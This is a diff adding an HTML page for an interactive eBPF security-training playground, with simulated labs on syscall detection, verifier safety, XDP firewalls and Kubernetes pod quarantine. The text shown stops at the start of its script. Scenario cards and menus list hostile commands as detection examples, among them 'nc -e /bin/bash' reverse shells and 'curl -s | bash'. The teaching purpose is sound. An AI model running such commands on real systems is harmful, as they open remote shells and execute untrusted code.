@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>eBPF Interactive Playground — linux-hpc-security</title>
+  <meta name="description" content="6 live eBPF + TypeSafe AI + K8s AutoSOC labs — Syscall Interceptor, Verifier Bomb, Ring Buffer, AI Engine, XDP Firewall, K8s Cluster. Pure JS, no backend.">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐧</text></svg>">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <!-- Lazy-load font after page renders -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" media="print" onload="this.media='all'">
+  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap"></noscript>
+  <!-- Comfy design system -->
+  <link rel="stylesheet" href="../../assets/css/comfy.css">
+  <style>
+    /* ── Page-specific overrides ── */
+    main {
+      padding: 28px 32px 80px;
+      max-width: 1200px;
+      margin: auto;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 22px;
+    }
+    .full { grid-column: 1 / -1; }
+    .hero {
+      background: linear-gradient(135deg, #131110 0%, #1e1a14 50%, #131110 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 44px 32px 36px;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero::before {
+      content: '';
+      position: absolute; inset: 0;
+      background:
+        radial-gradient(ellipse 70% 50% at 60% 50%, rgba(251,191,36,0.07) 0%, transparent 70%),
+        radial-gradient(ellipse 40% 60% at 10% 80%, rgba(74,222,128,0.05) 0%, transparent 60%);
+      pointer-events: none;
+    }
+    .hero-inner { position: relative; max-width: 1200px; margin: auto; }
+    .hero h1 {
+      font-size: clamp(26px, 4vw, 42px);
+      font-weight: 800;
+      background: linear-gradient(135deg, #f0ebe3 0%, #fbbf24 45%, #4ade80 100%);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+      margin-bottom: 10px;
+    }
+    .hero-sub { color: var(--text-muted); font-size: 14px; max-width: 640px; margin-top: 8px; line-height: 1.65; }
+    .hero-stats { display: flex; gap: 22px; margin-top: 18px; flex-wrap: wrap; }
+    .hero-stat { display: flex; align-items: center; gap: 7px; font-size: 12px; color: var(--text-dim); }
+    .hero-badge-pill {
+      display: inline-flex; align-items: center; gap: 7px;
+      background: rgba(251,191,36,0.1); border: 1px solid rgba(251,191,36,0.25);
+      color: var(--amber); font-size: 11px; font-weight: 700; letter-spacing: 0.08em;
+      padding: 4px 11px; border-radius: 99px; margin-bottom: 14px; text-transform: uppercase;
+    }
+    .hero-badge-pill .dot {
+      width: 7px; height: 7px; border-radius: 50%;
+      background: var(--amber); box-shadow: 0 0 7px var(--amber);
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+    .hero-back {
+      display: inline-flex; align-items: center; gap: 7px;
+      color: var(--text-dim); text-decoration: none;
+      font-size: 12px; font-weight: 600;
+      padding: 6px 13px; border: 1px solid var(--border-soft);
+      border-radius: 99px; transition: all 0.2s; margin-top: 20px;
+    }
+    .hero-back:hover { color: var(--amber); border-color: rgba(251,191,36,0.4); text-decoration: none; }
+
+    .sec-hdr {
+      grid-column: 1/-1;
+      padding: 10px 0 6px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 2px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .sec-hdr h3 { font-size: 11px; font-weight: 800; letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-dim); }
+    .sec-hdr-line { flex: 1; height: 1px; background: var(--border); }
+
+    .card-title { font-size: 15px; font-weight: 700; margin-bottom: 5px; display: flex; align-items: center; gap: 8px; }
+    .card-hint { color: var(--text-muted); font-size: 12.5px; margin-bottom: 14px; line-height: 1.55; }
+
+    .interact-hint {
+      font-size: 11.5px; color: var(--green); margin: 5px 0 10px;
+      font-style: italic; display: flex; align-items: center; gap: 5px; opacity: 0.85;
+    }
+
+    .scenario-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 9px; margin-top: 12px; }
+
+    /* Progress tracker */
+    .progress-tracker {
+      grid-column: 1/-1;
+      background: var(--bg-2); border: 1px solid var(--border);
+      border-radius: var(--radius); padding: 20px 24px;
+      display: flex; align-items: center; gap: 20px; flex-wrap: wrap;
+    }
+    .prog-step {
+      display: flex; align-items: center; gap: 8px;
+      font-size: 12px; color: var(--text-dim); font-weight: 600;
+    }
+    .prog-step .num {
+      width: 26px; height: 26px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-family: var(--mono); font-size: 11px; font-weight: 800;
+      border: 2px solid var(--border-soft);
+      flex-shrink: 0; transition: all 0.4s;
+    }
+    .prog-step.done .num { background: var(--amber); border-color: var(--amber); color: #1a1409; }
+    .prog-step.active .num { border-color: var(--amber); color: var(--amber); }
+    .prog-sep { width: 30px; height: 2px; background: var(--border); flex-shrink: 0; }
+    .prog-sep.done { background: var(--amber); }
+
+    /* Canvas */
+    canvas { width: 100%; border-radius: var(--radius-sm); margin-top: 10px; display: block; background: var(--bg-3); }
+
+    footer {
+      background: var(--bg-2);
+      border-top: 1px solid var(--border);
+      padding: 28px 32px;
+      text-align: center;
+      margin-top: 40px;
+    }
+    footer a { color: var(--amber); }
+
+    @media (max-width: 700px) {
+      main { grid-template-columns: 1fr; padding: 16px; }
+      .scenario-grid { grid-template-columns: 1fr 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="hero">
+    <div class="hero-inner">
+      <div class="hero-badge-pill"><span class="dot"></span> 6 Live Labs · Zero Backend · eBPF + TypeSafe AI + K8s</div>
+      <h1>🐧 eBPF Swarm Playground</h1>
+      <p class="hero-sub">Every concept from the capstone — syscall interception, Verifier safety, ring buffers, TypeSafe AI decisions, XDP firewalls, and K8s AutoSOC — running live in your browser. Pick scenarios, earn XP, earn badges.</p>
+      <div class="hero-stats">
+        <div class="hero-stat"><span style="width:8px;height:8px;border-radius:50%;background:var(--green);display:inline-block;box-shadow:0 0 6px var(--green);animation:pulse 2s infinite;"></span>Pure JS · No backend · No libraries</div>
+        <div class="hero-stat">🔴 Ring 0 → 🔵 Ring 3 → 🧠 TypeSafe → ☸️ K8s</div>
+        <div class="hero-stat">⚡ 6 Labs · 8 Quiz questions · 7 Badges</div>
+      </div>
+      <a href="./index.html" class="hero-back">← Back to Capstone Write-up</a>
+    </div>
+  </div>
+</header>
+
+<!-- XP BAR -->
+<div class="comfy-xp-bar">
+  <span class="comfy-xp-lbl">🏆 XP</span>
+  <div class="comfy-xp-track"><div class="comfy-xp-fill" id="xpFill"></div></div>
+  <span class="comfy-xp-lbl" id="xpText">0 / 600</span>
+  <div class="comfy-xp-badges">
+    <span class="comfy-xbadge" data-xp="50"  title="First Syscall Intercepted">🔴</span>
+    <span class="comfy-xbadge" data-xp="120" title="Verifier Defender">🛡️</span>
+    <span class="comfy-xbadge" data-xp="200" title="Ring Buffer Engineer">🔵</span>
+    <span class="comfy-xbadge" data-xp="300" title="TypeSafe Operator">🧠</span>
+    <span class="comfy-xbadge" data-xp="420" title="XDP Firewall Architect">🔥</span>
+    <span class="comfy-xbadge" data-xp="550" title="AutoSOC Engineer">☸️</span>
+    <span class="comfy-xbadge" data-xp="600" title="Autonomous SIEM Graduate">🎓</span>
+  </div>
+</div>
+
+<!-- NAV TABS -->
+<nav class="comfy-nav-tabs" id="navTabs">
+  <div class="comfy-nav-tab active" data-target="sec-overview">🗺️ Overview</div>
+  <div class="comfy-nav-tab" data-target="sec-syscall">🔴 Syscall</div>
+  <div class="comfy-nav-tab" data-target="sec-verifier">🛡️ Verifier</div>
+  <div class="comfy-nav-tab" data-target="sec-ringbuf">🔵 Ring Buffer</div>
+  <div class="comfy-nav-tab" data-target="sec-typesafe">🧠 TypeSafe AI</div>
+  <div class="comfy-nav-tab" data-target="sec-xdp">🔥 XDP</div>
+  <div class="comfy-nav-tab" data-target="sec-autosoc">☸️ AutoSOC</div>
+  <div class="comfy-nav-tab" data-target="sec-quiz">🎓 Quiz</div>
+</nav>
+
+<main>
+
+<!-- ═══ PROGRESS TRACKER ═══ -->
+<div class="progress-tracker lazy-reveal" id="progressTracker">
+  <div class="prog-step active" id="ps-1"><div class="num">1</div>Syscall</div>
+  <div class="prog-sep" id="psp-1"></div>
+  <div class="prog-step" id="ps-2"><div class="num">2</div>Verifier</div>
+  <div class="prog-sep" id="psp-2"></div>
+  <div class="prog-step" id="ps-3"><div class="num">3</div>Ring Buffer</div>
+  <div class="prog-sep" id="psp-3"></div>
+  <div class="prog-step" id="ps-4"><div class="num">4</div>TypeSafe AI</div>
+  <div class="prog-sep" id="psp-4"></div>
+  <div class="prog-step" id="ps-5"><div class="num">5</div>XDP Firewall</div>
+  <div class="prog-sep" id="psp-5"></div>
+  <div class="prog-step" id="ps-6"><div class="num">6</div>K8s AutoSOC</div>
+  <div class="prog-sep" id="psp-6"></div>
+  <div class="prog-step" id="ps-7"><div class="num">🎓</div>Quiz</div>
+</div>
+
+<!-- ═══ OVERVIEW ═══ -->
+<div class="comfy-card full lazy-reveal" id="sec-overview">
+  <div class="card-title">🗺️ The Autonomous SIEM Pipeline — What You Are Building</div>
+  <p class="card-hint">Each lab corresponds to a real stage in our capstone. A reverse shell detected at Ring 0 becomes an autonomous cluster-wide quarantine in 400ms — zero human in the loop. Animate it below.</p>
+  <div class="comfy-pipeline" id="overview-pipeline">
+    <div class="comfy-pipe-step active" id="pp-0"><div class="icon">🔴</div><div class="label">eBPF Hook</div><div class="desc">sys_enter_execve<br>Ring 0 · Kernel</div></div>
+    <div class="comfy-pipe-arrow">→</div>
+    <div class="comfy-pipe-step" id="pp-1"><div class="icon">🔵</div><div class="label">Ring Buffer</div><div class="desc">BPF_PERF_OUTPUT<br>Zero-copy</div></div>
+    <div class="comfy-pipe-arrow">→</div>
+    <div class="comfy-pipe-step" id="pp-2"><div class="icon">🐍</div><div class="label">Python Agent</div><div class="desc">Heuristic filter<br>Ring 3</div></div>
+    <div class="comfy-pipe-arrow">→</div>
+    <div class="comfy-pipe-step" id="pp-3"><div class="icon">🧠</div><div class="label">TypeSafe AI</div><div class="desc">Noul · Choice<br>Deterministic</div></div>
+    <div class="comfy-pipe-arrow">→</div>
+    <div class="comfy-pipe-step" id="pp-4"><div class="icon">☸️</div><div class="label">K8s Operator</div><div class="desc">NetworkPolicy<br>Quarantine</div></div>
+  </div>
+  <button class="comfy-btn comfy-btn-primary" id="animatePipeline">▶ Animate Threat Flow</button>
+  <button class="comfy-btn comfy-btn-ghost" id="resetPipeline" style="margin-top:5px;">↺ Reset</button>
+  <div class="comfy-note comfy-note-insight" style="margin-top:14px;">
+    <div class="comfy-note-icon">💡</div>
+    <div class="comfy-note-body">
+      <div class="comfy-note-title">Key Insight</div>
+      PID 442644 executing <code style="font-family:var(--mono);font-size:0.82em;background:rgba(255,255,255,0.06);padding:2px 5px;border-radius:4px;color:var(--teal);">nc -e /bin/bash</code> was detected and the pod isolated in under 400ms. No human in the loop. No hallucination possible.
+    </div>
+  </div>
+</div>
+
+<!-- ═══ LAB 1 — SYSCALL ═══ -->
+<div class="sec-hdr lazy-reveal" id="sec-syscall">
+  <h3>🔴 Lab 1 — Syscall Interceptor · Ring 0 eBPF</h3>
+  <div class="sec-hdr-line"></div>
+</div>
+
+<div class="comfy-card full lazy-reveal">
+  <div class="card-title">🔴 Lab 1 — Syscall Scenario Simulator <span class="comfy-badge comfy-badge-red">Ring 0</span></div>
+  <p class="card-hint">Pick a scenario. The eBPF tracepoint fires on sys_enter_execve and extracts PID/PPID from task_struct. Can you identify the real reverse shell vs false positives — like a Tier-2 SOC analyst would?</p>
+  <span class="comfy-tag comfy-tag-red">sys_enter_execve</span>
+  <span class="comfy-tag">task_struct</span>
+  <span class="comfy-tag comfy-tag-amber">BPF_PERF_OUTPUT</span>
+  <div class="interact-hint">👆 Select a scenario → read the eBPF telemetry → make your call</div>
+  <div class="scenario-grid" id="syscall-scenarios">
+    <div class="comfy-scenario selected" onclick="selectScenario(0)"><span class="sc-icon">💻</span><b>Reverse Shell</b><span>nc -e /bin/bash<br>PID: 442644</span></div>
+    <div class="comfy-scenario" onclick="selectScenario(1)"><span class="sc-icon">🖥️</span><b>GNOME Terminal</b><span>vte-urlencode-cwd<br>Harmless?</span></div>
+    <div class="comfy-scenario" onclick="selectScenario(2)"><span class="sc-icon">🔑</span><b>SSH Login</b><span>sshd → bash<br>Lateral move?</span></div>
+    <div class="comfy-scenario" onclick="selectScenario(3)"><span class="sc-icon">🕸️</span><b>Web Shell</b><span>apache → bash → nc<br>Critical!</span></div>
+    <div class="comfy-scenario" onclick="selectScenario(4)"><span class="sc-icon">⚙️</span><b>Cron Job</b><span>cron → /usr/bin/nc<br>Scheduled?</span></div>
+    <div class="comfy-scenario" onclick="selectScenario(5)"><span class="sc-icon">🧪</span><b>Scanner</b><span>nmap → nc<br>Pen test?</span></div>
+  </div>
+  <div class="comfy-output" id="syscall-telemetry" style="min-height:90px;margin-top:14px;"></div>
+  <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;">
+    <button class="comfy-btn comfy-btn-danger" onclick="judgeScenario('THREAT')">🔴 THREAT</button>
+    <button class="comfy-btn comfy-btn-ghost" onclick="judgeScenario('BENIGN')">✅ BENIGN</button>
+    <button class="comfy-btn" style="background:var(--amber);color:#1a1409;" onclick="judgeScenario('FP')">⚠️ FALSE POSITIVE</button>
+  </div>
+  <div class="comfy-output" id="syscall-result" style="min-height:42px;margin-top:10px;"></div>
+  <div class="comfy-note comfy-note-challenge" style="margin-top:14px;">
+    <div class="comfy-note-icon">🎯</div>
+    <div class="comfy-note-body">
+      <div class="comfy-note-title">Challenge</div>
+      "GNOME Terminal" matches the 'nc' substring — our naive detector flagged it as a THREAT. This is the real false positive from Test 1. TypeSafe AI (Lab 4) fixes it by evaluating the full parent chain, not just the filename.
+    </div>
+  </div>
+</div>
+
+<!-- ═══ LAB 2 — VERIFIER ═══ -->
+<div class="sec-hdr lazy-reveal" id="sec-verifier">
+  <h3>🛡️ Lab 2 — eBPF Verifier · Mathematical Safety</h3>
+  <div class="sec-hdr-line"></div>
+</div>
+
+<div class="comfy-card lazy-reveal">
+  <div class="card-title">💣 Lab 2A — Inject a Bomb <span class="comfy-badge comfy-badge-red">dangerous</span></div>
+  <p class="card-hint">Try to slip malicious code past the Verifier. It statically proves all execution paths before a single instruction runs. No sampling. No fuzzing. Mathematical certainty.</p>
+  <span class="comfy-tag comfy-tag-red">Clang JIT</span> <span class="comfy-tag comfy-tag-red">BPF Verifier</span>
+  <div class="interact-hint">👆 Select injection type — watch the Verifier pipeline respond</div>
+  <label class="comfy-label">Code Injection Type</label>
+  <select class="comfy-select" id="verifier-attack" onchange="runVerifier()">
+    <option value="safe">✅ Safe eBPF probe (read-only)</option>
+    <option value="loop">💣 Infinite loop: while(1){}</option>
+    <option value="oob">💣 Out-of-bounds memory read</option>
+    <option value="null">💣 NULL pointer dereference</option>
+    <option value="bigloop">💣 Loop: 1,000,000 iterations</option>
+  </select>
+  <canvas id="verifier-canvas" height="90" loading="lazy"></canvas>
+  <div class="comfy-output" id="verifier-out" style="min-height:70px;"></div>
+  <div class="comfy-note comfy-note-challenge" style="margin-top:12px;">
+    <div class="comfy-note-icon">🎯</div>
+    <div class="comfy-note-body"><div class="comfy-note-title">Challenge</div>Select "bigloop" → Verifier rejects at 1M instruction limit. Same loop as a .ko module = kernel panic. This is why eBPF replaced kernel modules at Meta & Cloudflare.</div>
+  </div>
+</div>
+
+<div class="comfy-card lazy-reveal">
+  <div class="card-title">⚔️ Lab 2B — .ko Module vs eBPF <span class="comfy-badge comfy-badge-green">comparison</span></div>
+  <p class="card-hint">Same malicious code, two runtimes. See exactly why eBPF is safe and kernel modules are not.</p>
+  <div class="interact-hint">👆 Select attack — see both outcomes side-by-side</div>
+  <label class="comfy-label">Attack Scenario</label>
+  <select class="comfy-select" id="ko-vs-ebpf" onchange="runKoVsEbpf()">
+    <option value="loop">Infinite loop</option>
+    <option value="nullptr">NULL dereference</option>
+    <option value="oob">Out-of-bounds write</option>
+    <option value="panic">Direct kernel panic</option>
+  </select>
+  <div class="grid-2" style="margin-top:12px;">
+    <div>
+      <div style="font-size:10px;font-weight:800;color:var(--red);text-transform:uppercase;margin-bottom:6px;letter-spacing:0.08em;">💀 .ko Kernel Module</div>
+      <div class="comfy-output comfy-output-threat" id="ko-out" style="min-height:110px;"></div>
+    </div>
+    <div>
+      <div style="font-size:10px;font-weight:800;color:var(--green);text-transform:uppercase;margin-bottom:6px;letter-spacing:0.08em;">🛡️ eBPF Program</div>
+      <div class="comfy-output comfy-output-safe" id="ebpf-out" style="min-height:110px;"></div>
+    </div>
+  </div>
+  <div class="comfy-note comfy-note-insight" style="margin-top:10px;">
+    <div class="comfy-note-icon">💡</div>
+    <div class="comfy-note-body"><div class="comfy-note-title">The Math</div>eBPF Verifier models every execution path and proves termination. Deployed by Meta, Cloudflare, and Google in production kernels.</div>
+  </div>
+</div>
+
+<!-- ═══ LAB 3 — RING BUFFER ═══ -->
+<div class="sec-hdr lazy-reveal" id="sec-ringbuf">
+  <h3>🔵 Lab 3 — BPF Ring Buffer · Zero-Copy Data Path</h3>
+  <div class="sec-hdr-line"></div>
+</div>
+
+<div class="comfy-card full lazy-reveal">
+  <div class="card-title">🔵 Lab 3 — Ring Buffer Live Visualizer <span class="comfy-badge comfy-badge-teal">zero-copy</span></div>
+  <p class="card-hint">Visualize BPF_PERF_OUTPUT streaming kernel events to user-space asynchronously. Overwhelm the buffer to watch events drop — exactly what happens during a DDoS if your detector polls too slowly.</p>
+  <span class="comfy-tag">BPF_PERF_OUTPUT</span> <span class="comfy-tag comfy-tag-green">perf_buffer.poll()</span>
+  <div class="grid-2">
+    <div>
+      <div class="interact-hint">👆 Increase event rate to simulate a DDoS — watch drops turn red</div>
+      <label class="comfy-label">Kernel event rate (ev/s): <span class="val" id="ev-rate-val">20</span></label>
+      <input type="range" id="ev-rate" min="1" max="100" value="20" oninput="updateRingBuf()">
+      <label class="comfy-label">Ring buffer capacity (slots): <span class="val" id="buf-size-val">32</span></label>
+      <input type="range" id="buf-size" min="4" max="64" value="32" oninput="updateRingBuf()">
+      <label class="comfy-label">Agent poll speed (ms): <span class="val" id="poll-speed-val">50</span></label>
+      <input type="range" id="poll-speed" min="10" max="500" value="50" oninput="updateRingBuf()">
+      <div style="margin-top:12px;display:flex;gap:8px;">
+        <button class="comfy-btn comfy-btn-green" id="ringbuf-start" onclick="toggleRingBuf()">▶ Start</button>
+        <button class="comfy-btn comfy-btn-ghost" onclick="resetRingBuf()">↺ Reset</button>
+      </div>
+      <div class="comfy-output" id="ringbuf-stats" style="margin-top:12px;"></div>
+    </div>
+    <div><canvas id="ringbuf-canvas" height="240" loading="lazy" style="margin-top:0;"></canvas></div>
+  </div>
+  <div class="comfy-note comfy-note-challenge" style="margin-top:14px;">
+    <div class="comfy-note-icon">🎯</div>
+    <div class="comfy-note-body"><div class="comfy-note-title">Challenge</div>Set rate=100, buffer=8, poll=500ms → drops appear in red. This is why detector.py polls at 100ms. Set rate=5, buffer=64 → zero drops. This balance determines real-world fidelity.</div>
+  </div>
+</div>
+
+<!-- ═══ LAB 4 — TYPESAFE AI ═══ -->
+<div class="sec-hdr lazy-reveal" id="sec-typesafe">
+  <h3>🧠 Lab 4 — TypeSafe AI Decision Engine</h3>
+  <div class="sec-hdr-line"></div>
+</div>
+
+<div class="comfy-card lazy-reveal">
+  <div class="card-title">🎰 Lab 4A — Slot Machine vs ChatGPT <span class="comfy-badge comfy-badge-purple">deterministic</span></div>
+  <p class="card-hint">TypeSafe Choice always returns one of three hard-coded enums. ChatGPT returns free text — which breaks autonomous pipelines. Feed telemetry and compare both outputs.</p>
+  <span class="comfy-tag comfy-tag-purple">Noul primitive</span> <span class="comfy-tag comfy-tag-purple">Choice primitive</span>
+  <div class="interact-hint">👆 Change process + parent — watch typed vs free-text respond</div>
+  <label class="comfy-label">Process</label>
+  <select class="comfy-select" id="proc-select" onchange="runTypeSafe()">
+    <option value="nc">nc (netcat)</option>
+    <option value="bash">bash</option>
+    <option value="python3">python3</option>
+    <option value="curl">curl -s | bash</option>
+    <option value="gnome">vte-urlencode-cwd</option>
+    <option value="sshd">sshd</option>
+  </select>
+  <label class="comfy-label">Parent Process</label>
+  <select class="comfy-select" id="ppid-select" onchange="runTypeSafe()">
+    <option value="bash">bash</option>
+    <option value="apache">apache2 (web server!)</option>
+    <option value="cron">cron</option>
+    <option value="sshd">sshd</option>
+    <option value="systemd">systemd</option>
+    <option value="gnome-terminal">gnome-terminal</option>
+  </select>
+  <div class="grid-2" style="margin-top:12px;">
+    <div>
+      <div style="font-size:10px;font-weight:800;color:var(--purple);text-transform:uppercase;margin-bottom:6px;letter-spacing:0.08em;">🧠 TypeSafe (typed)</div>
+      <div class="comfy-output comfy-output-purple" id="typesafe-out" style="min-height:100px;"></div>
+    </div>
+    <div>
+      <div style="font-size:10px;font-weight:800;color:var(--amber);text-transform:uppercase;margin-bottom:6px;letter-spacing:0.08em;">💬 Generic LLM (free text)</div>
+      <div class="comfy-output comfy-output-warn" id="llm-out" style="min-height:100px;"></div>
+    </div>
+  </div>
+  <div class="comfy-note comfy-note-challenge" style="margin-top:12px;">
+    <div class="comfy-note-icon">🎯</div>
+    <div class="comfy-note-body"><div class="comfy-note-title">Challenge</div>nc + apache2 → KILL_PROCESS at 97%. vte-urlencode-cwd + gnome-terminal → IGNORE. Same binary, entirely different context. String matching cannot do this.</div>
+  </div>
+</div>
+
+<div class="comfy-card lazy-reveal">
+  <div class="card-title">📊 Lab 4B — Noul Signal Composer <span class="comfy-badge comfy-badge-purple">live</span></div>
+  <p class="card-hint">TypeSafe Noul must return float 0.0–1.0. Toggle threat signals to build the composite probability. Cross the threshold — trigger the action automatically.</p>
+  <div class="interact-hint">👆 Toggle signals → watch probability compose in real time</div>
+  <div id="signal-list" style="margin-top:8px;"></div>
+  <div class="comfy-bar comfy-bar-lg" style="margin-top:14px;">
+    <div class="fill" id="noul-bar" style="width:10%;background:var(--green);"></div>
+  </div>
+  <div style="display:flex;justify-content:space-between;font-size:10px;color:var(--text-dim);margin-top:4px;">
+    <span>0.0 — IGNORE</span><span>0.6 — ALERT</span><span>0.8 — QUARANTINE</span><span>1.0 — KILL</span>
+  </div>
+  <div class="comfy-output" id="noul-decision" style="margin-top:10px;min-height:42px;"></div>
+  <div class="comfy-note comfy-note-insight" style="margin-top:10px;">
+    <div class="comfy-note-icon">💡</div>
+    <div class="comfy-note-body"><div class="comfy-note-title">Enterprise Insight</div>Multi-signal composition is exactly how SIEM correlation rules work — but TypeSafe makes the probability a typed, auditable float that code can act on directly, not a human's gut feeling.</div>
+  </div>
+</div>
+
+<!-- ═══ LAB 5 — XDP ═══ -->
+<div class="sec-hdr lazy-reveal" id="sec-xdp">
+  <h3>🔥 Lab 5 — XDP Firewall · Hardware-Speed DDoS Defense</h3>
+  <div class="sec-hdr-line"></div>
+</div>
+
+<div class="comfy-card full lazy-reveal">
+  <div class="card-title">🔥 Lab 5 — XDP CPU Gauge Simulator <span class="comfy-badge comfy-badge-amber">hardware speed</span></div>
+  <p class="card-hint">Simulate a DDoS attack. Traditional iptables processes packets deep inside the kernel. XDP drops them at NIC level before sk_buff allocation. See the CPU delta — this is the Cloudflare model at Terabit scale.</p>
+  <span class="comfy-tag comfy-tag-red">XDP_DROP</span> <span class="comfy-tag">XDP_PASS</span> <span class="comfy-tag comfy-tag-amber">iptables</span>
+  <div class="grid-2">
+    <div>
+      <div class="interact-hint">👆 Ramp up attack — iptables CPU spikes, XDP stays flat</div>
+      <label class="comfy-label">Attack Packets/sec: <span class="val" id="attack-pps-val">0</span></label>
+      <input type="range" id="attack-pps" min="0" max="10000000" step="50000" value="0" oninput="updateXDP()">
+      <label class="comfy-label">Firewall Mode</label>
+      <select class="comfy-select" id="fw-mode" onchange="updateXDP()">
+        <option value="xdp">✅ eBPF XDP — NIC level (before sk_buff)</option>
+        <option value="iptables">❌ iptables/firewalld — kernel stack</option>
+        <option value="none">⚠️ No firewall — baseline</option>
+      </select>
+      <label class="comfy-label">Attack Type</label>
+      <select class="comfy-select" id="attack-type" onchange="updateXDP()">
+        <option value="icmp">ICMP Flood (Ping of Death)</option>
+        <option value="syn">TCP SYN Flood</option>
+        <option value="udp">UDP Amplification</option>
+        <option value="http">HTTP Layer 7 Flood</option>
+      </select>
+      <div class="comfy-output" id="xdp-stats" style="margin-top:12px;min-height:80px;"></div>
+    </div>
+    <div><canvas id="xdp-canvas" height="280" loading="lazy" style="margin-top:0;"></canvas></div>
+  </div>
+  <div class="comfy-note comfy-note-challenge" style="margin-top:14px;">
+    <div class="comfy-note-icon">🎯</div>
+    <div class="comfy-note-body"><div class="comfy-note-title">Challenge</div>5M PPS + iptables → CPU 94% → unresponsive. 5M PPS + XDP → CPU 3% → fully operational. This delta is why Cloudflare absorbs Terabit DDoS attacks without breaking a sweat.</div>
+  </div>
+</div>
+
+<!-- ═══ LAB 6 — K8S AUTOSOC ═══ -->
+<div class="sec-hdr lazy-reveal" id="sec-autosoc">
+  <h3>☸️ Lab 6 — Kubernetes AutoSOC Operator</h3>
+  <div class="sec-hdr-line"></div>
+</div>
+
+<div class="comfy-card full lazy-reveal">
+  <div class="card-title">☸️ Lab 6 — AutoSOC Cluster Simulator <span class="comfy-badge comfy-badge-teal">self-healing</span></div>
+  <p class="card-hint">Simulate a live Kubernetes cluster of 12 pods. Inject a reverse shell. Watch the Go Operator detect the label security=compromised and isolate the pod with a NetworkPolicy — the immune system in action.</p>
+  <span class="comfy-tag comfy-tag-teal">Reconciler Loop</span> <span class="comfy-tag comfy-tag-purple">TypeSafe KILL</span> <span class="comfy-tag comfy-tag-teal">NetworkPolicy</span>
+  <div class="interact-hint">👆 Click a pod to compromise it manually, or use the action buttons</div>
+  <div id="cluster-grid" style="display:grid;grid-template-columns:repeat(6,1fr);gap:9px;margin:16px 0;"></div>
+  <div style="display:flex;gap:9px;flex-wrap:wrap;margin-bottom:12px;">
+    <button class="comfy-btn comfy-btn-danger" onclick="infectedPod()">🔴 Inject Shell</button>
+    <button class="comfy-btn comfy-btn-purple" onclick="runOperator()">☸️ Run Operator</button>
+    <button class="comfy-btn comfy-btn-ghost" onclick="resetCluster()">↺ Reset</button>
+    <button class="comfy-btn comfy-btn-teal" onclick="runFullScenario()">⚡ Full Auto-Scenario</button>
+  </div>
+  <div class="comfy-output" id="operator-log" style="min-height:120px;max-height:200px;overflow-y:auto;font-size:11px;"></div>
+  <div class="comfy-pipeline" style="margin-top:18px;">
+    <div class="comfy-pipe-step" id="k8s-p1"><div class="icon">🔴</div><div class="label">eBPF Detects</div><div class="desc">sys_enter_execve</div></div>
+    <div class="comfy-pipe-arrow">→</div>
+    <div class="comfy-pipe-step" id="k8s-p2"><div class="icon">🧠</div><div class="label">TypeSafe KILL</div><div class="desc">Noul=0.95</div></div>
+    <div class="comfy-pipe-arrow">→</div>
+    <div class="comfy-pipe-step" id="k8s-p3"><div class="icon">🏷️</div><div class="label">Label Pod</div><div class="desc">security=compromised</div></div>
+    <div class="comfy-pipe-arrow">→</div>
+    <div class="comfy-pipe-step" id="k8s-p4"><div class="icon">☸️</div><div class="label">Reconciler</div><div class="desc">NetworkPolicy</div></div>
+    <div class="comfy-pipe-arrow">→</div>
+    <div class="comfy-pipe-step" id="k8s-p5"><div class="icon">🔒</div><div class="label">Isolated</div><div class="desc">400ms total</div></div>
+  </div>
+  <div class="comfy-note comfy-note-insight" style="margin-top:12px;">
+    <div class="comfy-note-icon">💡</div>
+    <div class="comfy-note-body"><div class="comfy-note-title">Self-Healing Infrastructure</div>The analyst reviews this on Monday morning. The cluster protected itself at 3am Friday. That's the difference between a $2M SIEM contract and a Go operator on a $50/month node.</div>
+  </div>
+</div>
+
+<!-- ═══ QUIZ ═══ -->
+<div class="sec-hdr lazy-reveal" id="sec-quiz">
+  <h3>🎓 SOC Engineer Quiz · Test Your Knowledge</h3>
+  <div class="sec-hdr-line"></div>
+</div>
+<div class="comfy-card full lazy-reveal">
+  <div class="card-title">🎓 SOC Quiz <span class="comfy-badge comfy-badge-green">earn XP</span></div>
+  <p class="card-hint">8 questions modeled on real SOC Tier-2 analyst and SRE interview questions. Each correct answer = 25 XP.</p>
+  <div id="quiz-container"></div>
+  <div class="comfy-output" id="quiz-score" style="margin-top:16px;min-height:32px;"></div>
+</div>
+
+</main>
+
+<footer>
+  <div style="margin-bottom:10px;font-weight:600;color:var(--text-muted);">🐧 eBPF Swarm Playground · Companion to the <a href="./index.html">Autonomous SIEM Capstone</a></div>
+  <div style="font-size:11px;color:var(--text-dim);">
+    <a href="https://satyabhan007.github.io/linux-hpc-security/">Course Home</a> &nbsp;·&nbsp;
+    <a href="https://github.com/satyabhan007/linux-hpc-security/tree/main/ebpf">eBPF Source</a> &nbsp;·&nbsp;
+    <a href="https://satyabhan007.github.io/ai-threat-defense/playground.html">AI Threat Defense Playground</a>
+  </div>
+</footer>
+
+<script>
+// ─── LAZY LOAD: IntersectionObserver for .lazy-reveal ───
+const lazyObs = new IntersectionObserver(entries => {
+  entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('loaded'); lazyObs.unobserve(e.target); } });
+}, { threshold: 0.06, rootMargin: '0px 0px -20px 0px' });
